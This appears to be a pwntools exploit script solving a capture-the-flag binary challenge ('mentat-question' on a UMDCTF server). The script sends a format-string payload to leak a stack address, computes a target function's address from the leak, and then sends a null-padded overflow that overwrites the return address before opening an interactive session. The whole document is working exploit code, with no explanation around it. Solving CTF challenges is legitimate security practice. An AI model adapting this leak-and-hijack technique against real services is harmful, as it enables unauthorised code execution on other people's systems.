command = b"Division\n1\n \n Yes%x%x%x%x%x%lx\n"
with open("cmd", "wb") as file:
    file.write(command)

import pwn

# p = pwn.process(["./mentat-question"])
p = pwn.remote("challs.umdctf.io", 32300)

p.send(command)
p.recvuntil(b"a Yes")
data = p.recvuntil(b" I")[:-2]

print(data)
main = int(data[data.index(b"b0") + 2:].decode(), 16)
print(hex(main))

secret = main - 302

p.sendline(b"1\n \n Yes" + b"\x00" * 21 + secret.to_bytes(16, "little"))

p.interactive()
